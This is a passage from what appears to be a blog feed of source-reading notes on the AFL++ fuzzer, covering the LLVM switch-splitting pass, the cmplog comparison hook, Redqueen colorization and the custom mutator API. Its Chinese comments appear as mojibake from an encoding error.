NewDefault);<br>          <span class="hljs-keyword">break</span>;<br><br>        }<br><br>      }<br><br>    }<br><br>  }<br></code></pre></td></tr></tbody></table></figure></li><li><p><code>switchConvert()</code>ï¼š</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">BasicBlock *<span class="hljs-title">SplitSwitchesTransform::switchConvert</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    CaseVector Cases, std::vector&lt;<span class="hljs-type">bool</span>&gt; bytesChecked, BasicBlock *OrigBlock,</span></span><br><span class="hljs-params"><span class="hljs-function">    BasicBlock *NewDefault, Value *Val, <span class="hljs-type">unsigned</span> level)</span> </span>{<br><br>  <span class="hljs-type">unsigned</span>     ValTypeBitWidth = Cases[<span class="hljs-number">0</span>].Val-&gt;<span class="hljs-built_in">getBitWidth</span>();<br>  IntegerType *ValType =<br>      IntegerType::<span class="hljs-built_in">get</span>(OrigBlock-&gt;<span class="hljs-built_in">getContext</span>(), ValTypeBitWidth);<br>  IntegerType *        ByteType = IntegerType::<span class="hljs-built_in">get</span>(OrigBlock-&gt;<span class="hljs-built_in">getContext</span>(), <span class="hljs-number">8</span>);<br>  <span class="hljs-type">unsigned</span>             BytesInValue = bytesChecked.<span class="hljs-built_in">size</span>();<br>  std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; setSizes;<br>  std::vector&lt;std::set&lt;<span class="hljs-type">uint8_t</span>&gt; &gt; <span class="hljs-built_in">byteSets</span>(BytesInValue, std::<span class="hljs-built_in">set</span>&lt;<span class="hljs-type">uint8_t</span>&gt;());<br><br>  <span class="hljs-comment">/* for each of the possible cases we iterate over all bytes of the values</span><br><span class="hljs-comment">   * build a set of possible values at each byte position in byteSets */</span><br>  <span class="hljs-keyword">for</span> (CaseExpr &amp;Case : Cases) {<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>; i &lt; BytesInValue; i++) {<br><br>      <span class="hljs-type">uint8_t</span> byte = (Case.Val-&gt;<span class="hljs-built_in">getZExtValue</span>() &gt;&gt; (i * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>;    <span class="hljs-comment">// è·å–Caseå€¼çš„æ¯ä¸€ä¸ªå­—èŠ‚ï¼Œå­˜æ”¾äºbyteSetsä¸­</span><br>      byteSets[i].<span class="hljs-built_in">insert</span>(byte);<br><br>    }<br><br>  }<br><br>  <span class="hljs-comment">/* find the index of the first byte position that was not yet checked. then</span><br><span class="hljs-comment">   * save the number of possible values at that byte position */</span><br>  <span class="hljs-type">unsigned</span> smallestIndex = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">unsigned</span> smallestSize = <span class="hljs-number">257</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>; i &lt; byteSets.<span class="hljs-built_in">size</span>(); i++) {  <span class="hljs-comment">// è¿™é‡Œçš„ä»£ç ä¸»è¦ç”¨äºé€’å½’ï¼ï¼ï¼</span><br><br>    <span class="hljs-keyword">if</span> (bytesChecked[i]) <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span> (byteSets[i].<span class="hljs-built_in">size</span>() &lt; smallestSize) {<br><br>      smallestIndex = i;<br>      smallestSize = byteSets[i].<span class="hljs-built_in">size</span>();<br><br>    }<br><br>  }<br><br>  <span class="hljs-built_in">assert</span>(bytesChecked[smallestIndex] == <span class="hljs-literal">false</span>);<br><br>  <span class="hljs-comment">/* there are only smallestSize different bytes at index smallestIndex */</span><br><br>  Instruction *Shift, *Trunc;<br>  Function *   F = OrigBlock-&gt;<span class="hljs-built_in">getParent</span>();<br>  BasicBlock * NewNode = BasicBlock::<span class="hljs-built_in">Create</span>(Val-&gt;<span class="hljs-built_in">getContext</span>(), <span class="hljs-string">"NodeBlock"</span>, F);<br>  Shift = BinaryOperator::<span class="hljs-built_in">Create</span>(Instruction::LShr, Val,<br>                                 ConstantInt::<span class="hljs-built_in">get</span>(ValType, smallestIndex * <span class="hljs-number">8</span>));  <span class="hljs-comment">// conditioné€»è¾‘å³ç§»</span><br>  NewNode-&gt;<span class="hljs-built_in">getInstList</span>().<span class="hljs-built_in">push_back</span>(Shift);<br><br>  <span class="hljs-keyword">if</span> (ValTypeBitWidth &gt; <span class="hljs-number">8</span>) {<br><br>    Trunc = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TruncInst</span>(Shift, ByteType);  <span class="hljs-comment">// æˆªæ–­</span><br>    NewNode-&gt;<span class="hljs-built_in">getInstList</span>().<span class="hljs-built_in">push_back</span>(Trunc);<br><br>  } <span class="hljs-keyword">else</span> {<br><br>    <span class="hljs-comment">/* not necessary to trunc */</span><br>    Trunc = Shift;<br><br>  }<br><br>  <span class="hljs-comment">/* this is a trivial case, we can directly check for the byte,</span><br><span class="hljs-comment">   * if the byte is not found go to default. if the byte was found</span><br><span class="hljs-comment">   * mark the byte as checked. if this was the last byte to check</span><br><span class="hljs-comment">   * we can finally execute the block belonging to this case */</span><br><br>  <span class="hljs-keyword">if</span> (smallestSize == <span class="hljs-number">1</span>) {<br><br>    <span class="hljs-type">uint8_t</span> byte = *(byteSets[smallestIndex].<span class="hljs-built_in">begin</span>());<br><br>    <span class="hljs-comment">/* insert instructions to check whether the value we are switching on is</span><br><span class="hljs-comment">     * equal to byte */</span><br>    ICmpInst *Comp =<br>        <span class="hljs-keyword">new</span> <span class="hljs-built_in">ICmpInst</span>(ICmpInst::ICMP_EQ, Trunc, ConstantInt::<span class="hljs-built_in">get</span>(ByteType, byte),<br>                     <span class="hljs-string">"byteMatch"</span>);<br>    NewNode-&gt;<span class="hljs-built_in">getInstList</span>().<span class="hljs-built_in">push_back</span>(Comp);<br><br>    bytesChecked[smallestIndex] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-type">bool</span> allBytesAreChecked = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">for</span> (std::vector&lt;<span class="hljs-type">bool</span>&gt;::iterator BCI = bytesChecked.<span class="hljs-built_in">begin</span>(),<br>                                     E = bytesChecked.<span class="hljs-built_in">end</span>();<br>         BCI != E; ++BCI) {<br><br>      <span class="hljs-keyword">if</span> (!*BCI) {<br><br>        allBytesAreChecked = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">break</span>;<br><br>      }<br><br>    }<br><br>    <span class="hljs-comment">//    if (std::all_of(bytesChecked.begin(), bytesChecked.end(),</span><br>    <span class="hljs-comment">//                    [](bool b) { return b; })) {</span><br><br>    <span class="hljs-keyword">if</span> (allBytesAreChecked) {<br><br>      <span class="hljs-built_in">assert</span>(Cases.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>);<br>      BranchInst::<span class="hljs-built_in">Create</span>(Cases[<span class="hljs-number">0</span>].BB, NewDefault, Comp, NewNode);<br><br>      <span class="hljs-comment">/* we have to update the phi nodes! */</span><br>      <span class="hljs-keyword">for</span> (BasicBlock::iterator I = Cases[<span class="hljs-number">0</span>].BB-&gt;<span class="hljs-built_in">begin</span>();<br>           I != Cases[<span class="hljs-number">0</span>].BB-&gt;<span class="hljs-built_in">end</span>(); ++I) {<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isa</span>&lt;PHINode&gt;(&amp;*I)) { <span class="hljs-keyword">continue</span>; }<br>        PHINode *PN = <span class="hljs-built_in">cast</span>&lt;PHINode&gt;(I);<br><br>        <span class="hljs-comment">/* Only update the first occurrence. */</span><br>        <span class="hljs-type">unsigned</span> Idx = <span class="hljs-number">0</span>, E = PN-&gt;<span class="hljs-built_in">getNumIncomingValues</span>();<br>        <span class="hljs-keyword">for</span> (; Idx != E; ++Idx) {<br><br>          <span class="hljs-keyword">if</span> (PN-&gt;<span class="hljs-built_in">getIncomingBlock</span>(Idx) == OrigBlock) {<br><br>            PN-&gt;<span class="hljs-built_in">setIncomingBlock</span>(Idx, NewNode);<br>            <span class="hljs-keyword">break</span>;<br><br>          }<br><br>        }<br><br>      }<br><br>    } <span class="hljs-keyword">else</span> {<br><br>      BasicBlock *BB = switchConvert(Cases, bytesChecked, OrigBlock, NewDefault,<br>                                     Val, level + <span class="hljs-number">1</span>);<br>      BranchInst::<span class="hljs-built_in">Create</span>(BB, NewDefault, Comp, NewNode);<br><br>    }<br><br>  }<br><br>  <span class="hljs-comment">/* there is no byte which we can directly check on, split the tree */</span><br>  <span class="hljs-keyword">else</span> {<br><span class="hljs-comment">// äºŒåˆ†æ³• åˆ†è€Œæ²»ä¹‹ï¼</span><br>    std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; byteVector;<br>    std::<span class="hljs-built_in">copy</span>(byteSets[smallestIndex].<span class="hljs-built_in">begin</span>(), byteSets[smallestIndex].<span class="hljs-built_in">end</span>(),<br>              std::<span class="hljs-built_in">back_inserter</span>(byteVector));<br>    std::<span class="hljs-built_in">sort</span>(byteVector.<span class="hljs-built_in">begin</span>(), byteVector.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-type">uint8_t</span> pivot = byteVector[byteVector.<span class="hljs-built_in">size</span>() / <span class="hljs-number">2</span>];<br><br>    <span class="hljs-comment">/* we already chose to divide the cases based on the value of byte at index</span><br><span class="hljs-comment">     * smallestIndex the pivot value determines the threshold for the decicion;</span><br><span class="hljs-comment">     * if a case value</span><br><span class="hljs-comment">     * is smaller at this byte index move it to the LHS vector, otherwise to the</span><br><span class="hljs-comment">     * RHS vector */</span><br><br>    CaseVector LHSCases, RHSCases;<br><br>    <span class="hljs-keyword">for</span> (CaseExpr &amp;Case : Cases) {<br><br>      <span class="hljs-type">uint8_t</span> byte = (Case.Val-&gt;<span class="hljs-built_in">getZExtValue</span>() &gt;&gt; (smallestIndex * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>;<br><br>      <span class="hljs-keyword">if</span> (byte &lt; pivot) {<br><br>        LHSCases.<span class="hljs-built_in">push_back</span>(Case);<br><br>      } <span class="hljs-keyword">else</span> {<br><br>        RHSCases.<span class="hljs-built_in">push_back</span>(Case);<br><br>      }<br><br>    }<br><br>    BasicBlock *LBB, *RBB;<br>    LBB = switchConvert(LHSCases, bytesChecked, OrigBlock, NewDefault, Val,<br>                        level + <span class="hljs-number">1</span>);<br>    RBB = switchConvert(RHSCases, bytesChecked, OrigBlock, NewDefault, Val,<br>                        level + <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* insert instructions to check whether the value we are switching on is</span><br><span class="hljs-comment">     * equal to byte */</span><br>    ICmpInst *Comp =<br>        <span class="hljs-keyword">new</span> <span class="hljs-built_in">ICmpInst</span>(ICmpInst::ICMP_ULT, Trunc,<br>                     ConstantInt::<span class="hljs-built_in">get</span>(ByteType, pivot), <span class="hljs-string">"byteMatch"</span>);<br>    NewNode-&gt;<span class="hljs-built_in">getInstList</span>().<span class="hljs-built_in">push_back</span>(Comp);<br>    BranchInst::<span class="hljs-built_in">Create</span>(LBB, RBB, Comp, NewNode);<br><br>  }<br><br>  <span class="hljs-keyword">return</span> NewNode;<br><br>}<br><br></code></pre></td></tr></tbody></table></figure><ul><li>ç®€å•æ¥è¯´ï¼Œå…¶åŠŸèƒ½å°±æ˜¯å°†switchåˆ†æ”¯ç»†ç²’åº¦åŒ–ï¼Œæ¯”å¦‚ï¼š</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// before spliting switches...</span><br>{<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> x;<br>    <span class="hljs-keyword">switch</span>(x){<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x12345678</span>:<br>            <span class="hljs-built_in">do_something1</span>();<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x78563412</span>:<br>            <span class="hljs-built_in">do_something2</span>();<br>    }<br>    <br>}<br><span class="hljs-comment">// after spliting switches...</span><br>{<br>    <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">0</span>] == <span class="hljs-number">0x78</span>)<br>        <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">1</span>] == <span class="hljs-number">0x56</span>))<br>            <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">2</span>] == <span class="hljs-number">0x34</span>))<br>                <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">3</span>] == <span class="hljs-number">0x12</span>))<br>                    <span class="hljs-built_in">do_something1</span>();<br>    <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">0</span>] == <span class="hljs-number">0x12</span>)<br>        <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">1</span>] == <span class="hljs-number">0x34</span>))<br>            <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">2</span>] == <span class="hljs-number">0x56</span>))<br>                <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">3</span>] == <span class="hljs-number">0x78</span>))<br>                    <span class="hljs-built_in">do_something2</span>();<br>}<br></code></pre></td></tr></tbody></table></figure></li></ul><h3 id="afl-complier-rt-o-c"><a href="#afl-complier-rt-o-c" class="headerlink" title="afl-complier-rt.o.c"></a>afl-complier-rt.o.c</h3><ul><li>ä»¥ <code>__cmplog_ins_hook1</code> ä¸ºä¾‹ï¼š</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">void</span> __cmplog_ins_hook1(<span class="hljs-type">uint8_t</span> arg1, <span class="hljs-type">uint8_t</span> arg2, <span class="hljs-type">uint8_t</span> attr) {<br><br>  <span class="hljs-comment">// fprintf(stderr, "hook1 arg0=%02x arg1=%02x attr=%u\n",</span><br>  <span class="hljs-comment">//         (u8) arg1, (u8) arg2, attr);</span><br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(!__afl_cmp_map || arg1 == arg2)) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// Oops? got it!</span><br><br>  <span class="hljs-type">uintptr_t</span> k = (<span class="hljs-type">uintptr_t</span>)__builtin_return_address(<span class="hljs-number">0</span>); <span class="hljs-comment">// __builtin_return_address()è¿”å›è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€ï¼Œ0è¡¨ç¤ºå½“å‰å‡½æ•°çš„è¿”å›åœ°å€ï¼Œ1è¡¨ç¤ºå½“å‰å‡½æ•°çš„è°ƒç”¨è€…çš„è¿”å›åœ°å€ï¼Œä»¥æ­¤ç±»æ¨ï¼Œkä¸ºå½“å‰å‡½æ•°çš„è¿”å›åœ°å€ã€‚ç›®çš„æ˜¯å•¥ï¼Ÿ</span><br>  k = (<span class="hljs-type">uintptr_t</span>)(<span class="hljs-built_in">default_hash</span>((u8 *)&amp;k, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">uintptr_t</span>)) &amp; (CMP_MAP_W - <span class="hljs-number">1</span>));  <span class="hljs-comment">//æŒ‡é’ˆï¼ˆè¿”å›åœ°å€ï¼‰è¿›è¡Œå“ˆå¸Œæ˜ å°„ï¼Œç„¶åä¸ä¸ŠCMP_MAPå¤§å°ï¼š65536</span><br><br>  u32 hits;<br><br>  <span class="hljs-keyword">if</span> (__afl_cmp_map-&gt;headers[k].type != CMP_TYPE_INS) {  <span class="hljs-comment">// é¦–å…ˆå‘½ä¸­ï¼Ÿ</span><br><br>    __afl_cmp_map-&gt;headers[k].type = CMP_TYPE_INS;       <span class="hljs-comment">// typeèµ‹å€¼</span><br>    hits = <span class="hljs-number">0</span>; <span class="hljs-comment">// åˆå§‹åŒ–hitså€¼</span><br>    __afl_cmp_map-&gt;headers[k].hits = <span class="hljs-number">1</span>; <span class="hljs-comment">// å‘½ä¸­å€¼hitsåˆå§‹åŒ–ä¸º1</span><br>    __afl_cmp_map-&gt;headers[k].shape = <span class="hljs-number">0</span>; <span class="hljs-comment">// ï¼Ÿ</span><br><br>  } <span class="hljs-keyword">else</span> {<br><br>    hits = __afl_cmp_map-&gt;headers[k].hits++;  <span class="hljs-comment">// å‘½ä¸­å€¼hits++ï¼Œå°†åŸæ¥å‘½ä¸­å€¼èµ‹å€¼ç»™å±€éƒ¨å˜é‡hits</span><br><br>  }<br><br>  __afl_cmp_map-&gt;headers[k].attribute = attr;  <span class="hljs-comment">// attributeï¼Ÿè²Œä¼¼æ˜¯1ï¼Ÿ</span><br><br>  hits &amp;= CMP_MAP_H - <span class="hljs-number">1</span>;  <span class="hljs-comment">// è®°å½•å‰ CMP_MAP_Hï¼ˆ32ï¼‰æ¬¡çš„å€¼ï¼Œè¶…è¿‡ CMP_MAP_H ä¼šæ›¿æ¢å‰é¢çš„å€¼</span><br>  __afl_cmp_map-&gt;log[k][hits].v0 = arg1;<br>  __afl_cmp_map-&gt;log[k][hits].v1 = arg2;<br><br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="2-Redqueen"><a href="#2-Redqueen" class="headerlink" title="2. Redqueen"></a>2. Redqueen</h2><h3 id="afl-fuzz-redqueen-c"><a href="#afl-fuzz-redqueen-c" class="headerlink" title="afl-fuzz-redqueen.c"></a>afl-fuzz-redqueen.c</h3><ul><li><p><code>colorization()</code> å¡«è‰²å‡½æ•° ==&gt; ç”Ÿæˆæ±¡ç‚¹ä¿¡æ¯</p><ul><li>é€šè¿‡<code>type_replace()</code>å‡½æ•°å¯¹è¾“å…¥çš„æ¯ä¸€ä¸ªå­—èŠ‚è¿›è¡ŒåŒç±»å‹çš„æ›¿æ¢ï¼Œe.g. è¯¥å­—èŠ‚ä¸ºå¤§å†™å­—æ¯ï¼Œé‚£ä¹ˆå°±å°†å…¶æ›¿æ¢ä¸ºå…¶ä»–å¤§å†™å­—æ¯</li><li><code>pop_biggest_range()</code>å¾—åˆ°ranges [åŒå‘é“¾è¡¨ï¼Œç”¨æ¥å­˜å‚¨å½“å‰è¾“å…¥çš„åˆ‡å‰²èŒƒå›´] æœ€å¤§çš„èŒƒå›´ï¼Œåˆ¤æ–­å¯¹å½“å‰èŒƒå›´çš„å­—èŠ‚æ”¹å˜æ˜¯å¦ä¼šå½±å“åˆ°è·¯å¾„çš„å˜åŒ–</li><li>æœ€ç»ˆå¾—åˆ°çš„rangesé“¾è¡¨ä¸­çš„æ¯ä¸€ä¸ªèŒƒå›´è¡¨ç¤ºå¯¹è¯¥èŒƒå›´è¿›è¡Œå˜å¼‚å¤§æ¦‚ç‡èƒ½å¤Ÿå¼•èµ·è¦†ç›–ç‡å˜åŒ–ï¼Œç”±æ­¤ç”Ÿæˆtaintä¿¡æ¯</li></ul></li><li><p><code>colorization()</code>åå¾—åˆ°ä¸€ä¸ªæ±¡ç‚¹åçš„è¾“å…¥bufå’ŒåŸå§‹è¾“å…¥orig_bufï¼Œç„¶ååˆ†åˆ«è¿è¡Œè¿™ä¸¤ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œå°†cmpè¦†ç›–ç‡ä¿¡æ¯ä¿å­˜ä»¥è¿›è¡Œåç»­åˆ†æï¼š</p><ul><li><strong>input-to-state</strong>é˜¶æ®µï¼šè°ƒç”¨<code>cmp_fuzz()</code>  TODO!</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>æ¨¡ç³Šæµ‹è¯•</tag>
      
      <tag>AFL++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFLplusplusè‡ªå®šä¹‰å˜å¼‚å™¨â€”æºç ç»†èŠ‚</title>
    <link href="/2023/03/09/AFLplusplus%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%98%E5%BC%82%E5%99%A8%E2%80%94%E6%BA%90%E7%A0%81%E7%BB%86%E8%8A%82/"/>
    <url>/2023/03/09/AFLplusplus%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%98%E5%BC%82%E5%99%A8%E2%80%94%E6%BA%90%E7%A0%81%E7%BB%86%E8%8A%82/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL-è‡ªå®šä¹‰å˜å¼‚å™¨"><a href="#AFL-è‡ªå®šä¹‰å˜å¼‚å™¨" class="headerlink" title="AFL++è‡ªå®šä¹‰å˜å¼‚å™¨"></a>AFL++è‡ªå®šä¹‰å˜å¼‚å™¨</h1><ul><li>æ”¯æŒC/C++åº“å’ŒPythonæ¨¡å¼<ul><li>C/C++ library (<code>*.so</code>)</li><li>Python module</li></ul></li></ul><h2 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1. ç®€ä»‹"></a>1. ç®€ä»‹</h2><p><strong>ç›¸å…³æ³¨æ„äº‹é¡¹</strong>ï¼š</p><ol><li><code>custom_mutator_stage</code>åœ¨ç¡®å®šæ€§å˜å¼‚ä¹‹åå¯ç”¨ï¼›</li><li>åœ¨ä½¿ç”¨C/C++æ¥å£æ—¶ï¼Œéœ€è¦å¼•å…¥ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼ˆåŠ¨æ€åº“è·¯å¾„å­˜æ”¾åœ¨ç¯å¢ƒå˜é‡<code>AFL_CUSTOM_MUTATOR_LIBRARY</code>ä¸­ï¼‰ï¼Œè¯¥åº“ï¼ˆéƒ¨åˆ†ï¼‰å®šä¹‰AFL++æš´éœ²å‡ºæ¥çš„æ¥å£</li></ol><p>å¯å‚è€ƒ <code>custom_mutators/examples</code> ç›®å½•ä¸‹çš„ç¤ºä¾‹æ–‡ä»¶</p><hr><h2 id="2-APIs"><a href="#2-APIs" class="headerlink" title="2. APIs"></a>2. APIs</h2><h3 id="æ€»è§ˆ"><a href="#æ€»è§ˆ" class="headerlink" title="æ€»è§ˆ"></a>æ€»è§ˆ</h3><p><strong>C/C++ï¼š</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">afl_custom_init</span><span class="hljs-params">(<span class="hljs-type">afl_state_t</span> *afl, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed)</span></span>;<br><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title">afl_custom_fuzz_count</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> buf_size)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">afl_custom_splice_optout</span><span class="hljs-params">(<span class="hljs-type">void</span> *data)</span></span>;<br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">afl_custom_fuzz</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> buf_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> **out_buf, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *add_buf, <span class="hljs-type">size_t</span> add_buf_size, <span class="hljs-type">size_t</span> max_size)</span></span>;<br><span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title">afl_custom_describe</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> max_description_len)</span></span>;<br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">afl_custom_post_process</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> buf_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> **out_buf)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">afl_custom_init_trim</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> buf_size)</span></span>;<br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">afl_custom_trim</span><span 